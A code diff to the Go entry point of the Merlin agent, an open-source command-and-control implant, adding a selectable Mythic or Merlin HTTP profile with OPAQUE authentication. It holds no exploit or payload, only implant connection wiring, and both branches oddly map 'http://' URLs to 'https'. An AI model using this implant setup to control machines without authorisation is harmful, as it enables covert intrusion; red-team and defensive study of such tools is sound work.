@@ -18,6 +18,8 @@
 package main
 
 import (
+	"fmt"
+	uuid "github.com/satori/go.uuid"
 
 	// Standard
 	"os"
@@ -29,6 +31,7 @@ import (
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin-agent/agent"
+	"github.com/Ne0nd0g/merlin-agent/clients/http"
 	"github.com/Ne0nd0g/merlin-agent/clients/mythic"
 	"github.com/Ne0nd0g/merlin-agent/core"
 )
@@ -50,8 +53,10 @@ var maxretry = "7"
 var padding = "4096"
 var verbose = "false"
 var debug = "false"
+var profile = ""
+var opaque []byte
 
-func main(){
+func main() {
 	core.Verbose, _ = strconv.ParseBool(verbose)
 	core.Debug, _ = strconv.ParseBool(debug)
 
@@ -70,35 +75,85 @@ func main(){
 		os.Exit(1)
 	}
 
-	// HTTP client configuration
-	clientConfig := mythic.Config{
-		AgentID:    a.ID,
-		PayloadID: 	payloadID,
-		URL: url,
-		PSK: psk,
-		UserAgent: useragent,
-		JA3: ja3,
-		Host: host,
-		Proxy: proxy,
-		Padding: padding,
-	}
-
-	// Parse http or https
-	if strings.HasPrefix(url, "https://"){
-		clientConfig.Protocol = "https"
-	} else if strings.HasPrefix(url, "http://"){
-		clientConfig.Protocol = "https"
-	} else {
-		if core.Verbose {
-			color.Red("unable to detect valid protocol from URL: " + url)
+	switch profile {
+	case "http":
+		// Mythic HTTP C2 profile client configuration
+		clientConfig := mythic.Config{
+			AgentID:   a.ID,
+			PayloadID: payloadID,
+			URL:       url,
+			PSK:       psk,
+			UserAgent: useragent,
+			JA3:       ja3,
+			Host:      host,
+			Proxy:     proxy,
+			Padding:   padding,
+		}
+		// Parse http or https
+		if strings.HasPrefix(url, "https://") {
+			clientConfig.Protocol = "https"
+		} else if strings.HasPrefix(url, "http://") {
+			clientConfig.Protocol = "https"
+		} else {
+			if core.Verbose {
+				color.Red("unable to detect valid protocol from URL: " + url)
+				os.Exit(1)
+			}
+		}
+		// Get the client
+		a.Client, err = mythic.New(clientConfig)
+		if err != nil {
+			if core.Verbose {
+				color.Red(err.Error())
+			}
 			os.Exit(1)
 		}
-	}
-
-	a.Client, err = mythic.New(clientConfig)
-	if err != nil {
+	case "merlin-http":
+		// Merlin HTTP C2 profile client configuration
+		clientConfig := http.Config{
+			Host:        host,
+			Proxy:       proxy,
+			UserAgent:   useragent,
+			PSK:         psk,
+			JA3:         ja3,
+			Padding:     padding,
+			AuthPackage: "opaque",
+			Opaque:      opaque,
+		}
+		// Set agentID to payload ID
+		clientConfig.AgentID, err = uuid.FromString(payloadID)
+		if err != nil {
+			if core.Verbose {
+				color.Red(fmt.Sprintf("there was an error converting the payload ID string \"%s\" to a uuid: %s", payloadID, err))
+			}
+			os.Exit(1)
+		}
+		// Parse URLs
+		if url != "" {
+			clientConfig.URL = strings.Split(strings.ReplaceAll(url, " ", ""), ",")
+		}
+		// Parse http or https
+		if strings.HasPrefix(url, "https://") {
+			clientConfig.Protocol = "https"
+		} else if strings.HasPrefix(url, "http://") {
+			clientConfig.Protocol = "https"
+		} else {
+			if core.Verbose {
+				color.Red("unable to detect valid protocol from URL: " + url)
+				os.Exit(1)
+			}
+		}
+		// Get the client
+		a.Client, err = http.New(clientConfig)
+		if err != nil {
+			if core.Verbose {
+				color.Red(err.Error())
+			}
+			os.Exit(1)
+		}
+	default:
 		if core.Verbose {
-			color.Red(err.Error())
+			color.Red(fmt.Sprintf("unknown C2 profile: %s", profile))
 		}
 		os.Exit(1)
 	}
